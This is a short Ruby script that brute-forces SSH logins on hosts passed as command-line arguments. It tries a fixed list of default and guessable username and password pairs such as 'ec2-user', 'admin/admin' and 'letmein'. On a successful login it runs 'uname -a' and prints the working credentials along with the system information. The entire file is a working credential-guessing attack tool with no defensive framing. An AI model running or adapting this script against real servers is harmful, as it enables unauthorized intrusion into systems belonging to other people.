#!/usr/bin/env ruby
require 'net/ssh'

usernames = ["ec2-user","admin","username","johntheripper","master","hacker","admin@metacorp.com"]
passwords = ["ec2-user","admin","password","johntheripper","master","letmein","admin1234"]

# Attempt brute force SSH login#

ARGV.each do |hostname|
  usernames.each_with_index do |username, index|
    password = passwords[index]
    cmd = 'uname -a'
    begin
      ssh = Net::SSH.start(hostname, username, password: password, :timeout => 10)
      res = ssh.exec!(cmd)
      ssh.close
      puts "SUCCESS: SSH connected to #{hostname} using #{username}/#{password}"
      puts "SYSTEM INFO: #{res}"
    rescue
      puts "FAIL: Unable to SSH connect to #{hostname} using #{username}/#{password}"
    end
  end
end
